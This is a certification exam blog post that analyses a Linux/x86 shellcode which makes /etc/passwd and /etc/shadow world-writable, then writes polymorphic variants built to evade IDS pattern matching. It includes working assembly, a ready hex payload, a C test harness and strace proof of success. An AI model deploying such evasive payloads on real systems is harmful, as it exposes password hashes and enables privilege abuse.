---
title: "SLAE x86 Exam - Assignment #6 Part 1"
date: 2022-01-04
toc: true
search: false
classes: wide
categories:
  - blog
tags:
  - slae
  - x86
  - assembly
  - nasm
  - c
  - exam
  - shellcode
  - polymorphism
---

## Disclaimer

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

<https://www.pentesteracademy.com/course?id=3>

Student ID: PA-30398

## Foreword

The 6th assignment requires you to analyze 3 shellcodes from [Shell-Storm](http://shell-storm.org/shellcode/) and "create polymorphic versions of them to beat pattern matching".

There's only 1 constraint:

> The polymorphic versions cannot be larger 150% of the existing shellcode

I chose the following shellcodes:

1. [Linux/x86 - chmod 666 /etc/passwd & /etc/shadow - 57 bytes](http://shell-storm.org/shellcode/files/shellcode-812.php)
2. [Linux/x86 - setuid(0) setgid(0) execve(echo 0 > /proc/sys/kernel/randomize_va_space) - 79 bytes](http://shell-storm.org/shellcode/files/shellcode-222.php)
3. [Linux/x86 - iptables --flush - 43 bytes](http://shell-storm.org/shellcode/files/shellcode-825.php)

In this part I'll create a polymorphic version of the 1st shellcode.

## Source code

The files for this part of the assignment are the following:

- [original_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/original_shellcode.nasm), contains the original shellcode of which I wrote a polymorphic version
- [polymorphic_stable.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/polymorphic_stable.nasm), contains the polymorphic version of the shellcode, but with a few more checks in order to avoid segmentation faults
- [polymorphic_tiny.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/polymorphic_tiny.nasm)
- [test_polymorphic_stable.c](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/1/test_polymorphic_stable.c), a C program for testing the polymorphic shellcode (`polymorphic_stable.nasm`)

## Definitions

> What is **Polymorphism**?

Polymorphism refers to the ability of something (e.g. shellcode, malwares) to mutate, while keeping intact the original code. For example, to clear a register you can use the following instruction:

```nasm
xor eax, eax
```

However, there are many more possibilities, like these:

```nasm
; mov-xor
mov EAX, 0xffffffff
xor EAX, 0xffffffff

; push-dec-pop
push 0x1
pop EAX
dec EAX

; mov-sub
mov EAX, 0xaabbccdd
sub EAX, 0xaabbccdd
```

In the case of shellcodes and malwares, the objective is to hide their presence from Security Protections that use **Pattern Matching**, such as `IDS` and `IPS` systems.

## Analysis

First, here's the original shellcode in **Intel syntax**, since the shellcode on the original page uses **AT&T syntax**.

```bash
echo -n "\x31\xc0\x66\xb9\xb6\x01\x50\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\xb0\x0f\xcd\x80\x31\xc0\x40\xcd\x80" > shellcode.bin

ndisasm -b 32 -p intel shellcode.bin
```

```nasm
                            ; EAX 0
00000000  31C0              xor eax,eax

                            ; ECX = 110110110
                            ; u=rw, g=rw, o=rw
00000002  66B9B601          mov cx,0x1b6

                            ; "/etc//passwd"
00000006  50                push eax
00000007  6873737764        push dword 0x64777373
0000000C  682F2F7061        push dword 0x61702f2f
00000011  682F657463        push dword 0x6374652f

                            ; EBX = pointer to "/etc//passwd"
00000016  89E3              mov ebx,esp

                            ; chmod(EBX, ECX)
                            ; ECX = permissions u=rw, g=rw, o=rw
00000018  B00F              mov al,0xf
0000001A  CD80              int 0x80
```

{% sidenote First it runs the instruction `chmod("/etc//passwd", 0666)` to change the permissions over `/etc/passwd` %}

```nasm
                            ; EAX = 0
0000001C  31C0              xor eax,eax
0000001E  50                push eax

                            ; "/etc//shadow"
0000001F  6861646F77        push dword 0x776f6461
00000024  682F2F7368        push dword 0x68732f2f
00000029  682F657463        push dword 0x6374652f

                            ; EBX = pointer to "/etc//shadow"
0000002E  89E3              mov ebx,esp

                            ; call chmod(EBX, ECX)
                            ; ECX = permissions u=rw, g=rw, o=rw
00000030  B00F              mov al,0xf
00000032  CD80              int 0x80
```

{% sidenote After that it runs the instruction `chmod("/etc//shadow", 0666)` to change the permissions over `/etc/shadow` %}

```nasm
                            ; call exit syscall
00000034  31C0              xor eax,eax
00000036  40                inc eax
00000037  CD80              int 0x80
```

{% sidenote Finally it exits using `exit(EBX)` %}

It translates into the following C program:

```cpp
#include <sys/stat.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
  chmod("/etc//passwd", 0666);
  chmod("/etc//shadow", 0666);

  // EBX is equal to ESP, so it's just a random exit code
  exit(EBX);
}
```

It changes the permissions on the files `/etc/passwd` and `/etc/shadow` to `0666`. After that, it uses the `exit` syscall to terminate its own execution.

## Polymorphic version

### Focus on size

Follows the smallest version I managed to write:

```nasm
; Author: Robert C. Raducioiu (rbct)

global _start

section .text

_start:

    ; clear ECX, EAX, EDX
    xor ecx, ecx
    mul ecx

    ; store "/etc" into ESI
    ;   this allows me to reuse this value for the second call to chmod
    mov esi, 0x6374652f

    ; add a NULL byte (in this case a NULL DWORD) at the end of the string
    ;   pushed to the stack
    push eax

    ; store the string "/etc//shadow" on the stack
    push dword 0x776f6461
    push dword 0x68732f2f
    push esi
```

{% sidenote Remember that when you push a string to the stack, the bytes must be **reversed**, as **the stack grows downward**  %}

```nasm
    ; 1st argument of chmod(): const char *pathname
    ; store into EBX the pointer to "/etc//shadow"
    mov ebx,esp

    ; set EAX to 0x0000000f -> chmod() syscall
    add al, 0xf

    ; 2nd argument of chmod(): mode_t mode
    ; in this case ECX is set to the binary value 110110110
    mov cx,0x1b6

    ; call chmod()
    int 0x80

    ; set EAX to 0 and push it to the stack;
    ; like before, it acts as the string terminator
    mov eax, edx
    push eax

    ; push "/etc//passwd" to the stack
    push dword 0x64777373

    ; also set EAX to 0x0000000f -> chmod() syscall
    add al, 0xf
    push dword 0x61702f2f

    ; reuse the value of "/etc" from before
    push esi
    
    ; 1st argument of chmod(): const char *pathname
    ; store into EBX the pointer to "/etc//passwd"
    push esp
    pop ebx

    ; call chmod()
    int 0x80

    ; invoke the exit syscall
    ; exit code is set to ESP, but it's not important
    mov eax, edx
    inc eax
    int 0x80
```

The original shellcode uses `57` bytes, while this one uses `52` bytes:

```bash
objcopy -O binary -j .text ./shellcode.o /dev/stdout | wc -c

# 52
```

Although, I managed to make it smaller, it requires one **condition**:

- the call to `chmod` MUST be successful, hence store `0` into `EAX`

If the register `EAX` isn't set to 0, then the next call will throw a `SIGSEGV` signal, so the program will crash.

### Focus on stability

For this reason, I also wrote a slightly different version that handles this case, not the SIGSEGV error but clearing the EAX register:

```patch
--- polymorphic_tiny.nasm       2022-01-12 07:54:18.947129214 +0000
+++ polymorphic_stable.nasm     2022-01-12 07:53:52.437239057 +0000
@@ -37,7 +37,9 @@
     ; call chmod()
     int 0x80
 
+    ; set EAX to 0 and push it to the stack;
     ; like before, it acts as the string terminator
+    mov eax, edx
     push eax
 
     ; push "/etc//passwd" to the stack
@@ -60,5 +62,6 @@
 
     ; invoke the exit syscall
     ; exit code is set to ESP, but it's not important
+    mov eax, edx
     inc eax
     int 0x80
```

Since I used the instruction `mul ecx` at the beginning, it means `EDX` and `EAX` are set to 0. Moreover, given `EDX` is never used, it means I could use it to clear other registers.

In this case I repeated two times the following instruction:

```nasm
mov eax, edx
```

Although not very small, at `56` bytes, this stable polymorphic version is still smaller than the original shellcode. 

### Testing

To test the polymorphic shellcode, I've used the following C program:

```cpp
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\xbe\x2f\x65\x74\x63\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x56\x89\xe3\x04\x0f\x66\xb9\xb6\x01\xcd\x80\x89\xd0\x50\x68\x73\x73\x77\x64\x04\x0f\x68\x2f\x2f\x70\x61\x56\x54\x5b\xcd\x80\x89\xd0\x40\xcd\x80";

main() {
    printf("Shellcode length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;
    ret();
}
```

To compile:

```bash
gcc -fno-stack-protector -z execstack -o test_polymorphic_shellcode test_polymorphic_shellcode.c
```

Once I've run it, I could confirm it executes changes the permissions over `/etc/passwd` and `/etc/shadow` successfully:

```bash
rbct@slae:~/exam/assignment_6/1$ sudo strace -e trace=chmod ./test_polymorphic_shellcode 
# Shellcode length: 56
# chmod("/etc//shadow", 0666)             = 0
# chmod("/etc//passwd", 0666)             = 0

rbct@slae:~/exam/assignment_6/1$
```

As you can see, `chmod` returned the value `0` in both cases, which means it managed to change the permissions and exit gracefully.
